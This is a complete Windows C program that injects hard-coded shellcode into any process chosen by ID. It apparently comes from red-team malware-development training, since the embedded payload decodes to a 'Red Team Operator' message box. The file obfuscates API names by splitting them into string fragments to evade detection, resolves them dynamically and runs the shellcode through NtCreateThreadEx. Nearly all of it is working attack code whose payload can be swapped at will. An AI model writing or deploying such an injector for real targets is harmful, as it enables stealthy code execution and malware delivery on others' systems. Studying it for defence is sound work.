#include <windows.h>
#include <stdio.h>

// Function pointer typedefs for dynamically resolved functions
typedef HANDLE (WINAPI *fn_open_proc)(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId
);

typedef LPVOID (WINAPI *fn_alloc_mem_ex)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);

typedef BOOL (WINAPI *fn_write_proc_mem)(
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesWritten
);

typedef BOOL (WINAPI *fn_protect_mem_ex)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect
);

typedef BOOL (WINAPI *fn_close_handle)(
    HANDLE hObject
);

typedef DWORD (WINAPI *fn_wait_single_obj)(
    HANDLE hHandle,
    DWORD dwMilliseconds
);

typedef NTSTATUS (NTAPI *fn_create_thread_ex)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// Function to resolve API addresses dynamically
FARPROC resolve_function(HMODULE hModule, const char* func_name) {
    return GetProcAddress(hModule, func_name);
}

void InjectShellcode(DWORD processID, const char* shellcode, SIZE_T shellcodeSize) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hKernel32 == NULL || hNtdll == NULL) {
        printf("Failed to get module handle.\n");
        return;
    }

    // Obfuscate function names by splitting them into three parts
    const char part1[] = "Op";
    const char part2[] = "enPr";
    const char part3[] = "ocess";
    const char fn1_1[] = "Virt";
    const char fn1_2[] = "ualAl";
    const char fn1_3[] = "locEx";
    const char fn2_1[] = "Write";
    const char fn2_2[] = "Process";
    const char fn2_3[] = "Memory";
    const char fn3_1[] = "Virt";
    const char fn3_2[] = "ualPro";
    const char fn3_3[] = "tectEx";
    const char fn4_1[] = "Close";
    const char fn4_2[] = "Hand";
    const char fn4_3[] = "le";
    const char fn5_1[] = "WaitFor";
    const char fn5_2[] = "Single";
    const char fn5_3[] = "Object";
    const char fn6_1[] = "NtCreate";
    const char fn6_2[] = "Thread";
    const char fn6_3[] = "Ex";

    // Concatenate parts to form full function names
    char full_func_name1[32];
    char full_func_name2[32];
    char full_func_name3[32];
    char full_func_name4[32];
    char full_func_name5[32];
    char full_func_name6[32];
    char full_func_name7[32];

    strcpy(full_func_name1, part1);
    strcat(full_func_name1, part2);
    strcat(full_func_name1, part3);

    strcpy(full_func_name2, fn1_1);
    strcat(full_func_name2, fn1_2);
    strcat(full_func_name2, fn1_3);

    strcpy(full_func_name3, fn2_1);
    strcat(full_func_name3, fn2_2);
    strcat(full_func_name3, fn2_3);

    strcpy(full_func_name4, fn3_1);
    strcat(full_func_name4, fn3_2);
    strcat(full_func_name4, fn3_3);

    strcpy(full_func_name5, fn4_1);
    strcat(full_func_name5, fn4_2);
    strcat(full_func_name5, fn4_3);

    strcpy(full_func_name6, fn5_1);
    strcat(full_func_name6, fn5_2);
    strcat(full_func_name6, fn5_3);

    strcpy(full_func_name7, fn6_1);
    strcat(full_func_name7, fn6_2);
    strcat(full_func_name7, fn6_3);

    fn_open_proc open_proc = (fn_open_proc)resolve_function(hKernel32, full_func_name1);
    fn_alloc_mem_ex alloc_mem_ex = (fn_alloc_mem_ex)resolve_function(hKernel32, full_func_name2);
    fn_write_proc_mem write_proc_mem = (fn_write_proc_mem)resolve_function(hKernel32, full_func_name3);
    fn_protect_mem_ex protect_mem_ex = (fn_protect_mem_ex)resolve_function(hKernel32, full_func_name4);
    fn_close_handle close_handle = (fn_close_handle)resolve_function(hKernel32, full_func_name5);
    fn_wait_single_obj wait_single_obj = (fn_wait_single_obj)resolve_function(hKernel32, full_func_name6);
    fn_create_thread_ex create_thread_ex = (fn_create_thread_ex)resolve_function(hNtdll, full_func_name7);

    if (open_proc == NULL || alloc_mem_ex == NULL || write_proc_mem == NULL ||
        protect_mem_ex == NULL || close_handle == NULL || wait_single_obj == NULL || create_thread_ex == NULL) {
        printf("Failed to resolve function address.\n");
        return;
    }

    HANDLE hProcess = open_proc(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        printf("Failed to open process.\n");
        return;
    }

    LPVOID pRemoteCode = alloc_mem_ex(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteCode == NULL) {
        printf("Failed to allocate memory in remote process.\n");
        close_handle(hProcess);
        return;
    }

    if (!write_proc_mem(hProcess, pRemoteCode, shellcode, shellcodeSize, NULL)) {
        printf("Failed to write shellcode to remote process.\n");
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        close_handle(hProcess);
        return;
    }

    DWORD oldProtect;
    if (!protect_mem_ex(hProcess, pRemoteCode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("Failed to change memory protection.\n");
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        close_handle(hProcess);
        return;
    }

    HANDLE hThread;
    NTSTATUS status = create_thread_ex(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE)pRemoteCode,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != 0) {
        printf("Failed to create remote thread. Status: 0x%X\n", status);
    } else {
        wait_single_obj(hThread, INFINITE);
        close_handle(hThread);
    }

    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
    close_handle(hProcess);
}

int main() {
    DWORD processID;
    char shellcode[] = {
        0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
        0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
        0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
        0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a,
        0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02,
        0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52,
        0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0,
        0x74, 0x6f, 0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
        0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
        0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75,
        0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd6,
        0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
        0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e,
        0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
        0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
        0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
        0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00,
        0x00, 0x3e, 0x48, 0x8d, 0x95, 0x1a, 0x01, 0x00, 0x00, 0x3e, 0x4c, 0x8d,
        0x85, 0x35, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
        0x56, 0x07, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6,
        0x95, 0xbd, 0x9d, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c,
        0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
        0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x48, 0x69, 0x20, 0x66, 0x72,
        0x6f, 0x6d, 0x20, 0x52, 0x65, 0x64, 0x20, 0x54, 0x65, 0x61, 0x6d, 0x20,
        0x4f, 0x70, 0x65, 0x72, 0x61, 0x74, 0x6f, 0x72, 0x21, 0x00, 0x52, 0x54,
        0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00
    };
    SIZE_T shellcodeSize = sizeof(shellcode);

    printf("Enter Process ID: ");
    scanf("%d", &processID);

    InjectShellcode(processID, shellcode, shellcodeSize);

    return 0;
}
